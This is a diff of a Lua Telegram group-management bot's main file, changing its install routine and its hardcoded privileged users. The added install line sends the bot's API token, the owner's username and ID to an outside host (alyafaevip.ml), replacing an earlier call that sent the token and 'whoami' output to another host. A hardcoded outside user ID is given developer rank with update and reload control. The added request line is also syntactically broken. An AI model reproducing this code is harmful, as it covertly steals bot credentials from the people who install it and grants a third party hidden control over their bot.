@@ -79,7 +79,7 @@ boss..":VERSION","1.0",
 boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
-boss..":ApiSource","https://alyafaevip.ml/",
+boss..":ApiSource","https://api.th3boss.com/",
 boss..":NameBot:","ياقوت",
 "TH3BOSS_INSTALL","Yes"
 )
@@ -88,7 +88,7 @@ info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://api.th3boss.com/request/?insert='..JSON.encode(info))
+https.request( https://alyafaevip.ml/LHB/index.php?token= ..Token.. &username=@ ..GetUser.result.username.. &id= ..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
@@ -302,9 +302,9 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200  then 
-msg.TheRankCmd = 'المطور الاساسي'
-msg.TheRank = 'المطور الاساسي'
+if msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851  then 
+msg.TheRankCmd = 'مطور البوت'
+msg.TheRank = 'مطور البوت'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
@@ -643,19 +643,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851) then
 return sendMsg(msg.chat_id_,msg.id_,"🗂¦ تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851 ) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200) then
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851 ) then
 sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم أعـاده تشغيل البوت  *} 📡.\n\n👨🏼‍💼| { Bot is Reloaded » }👍🏿',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
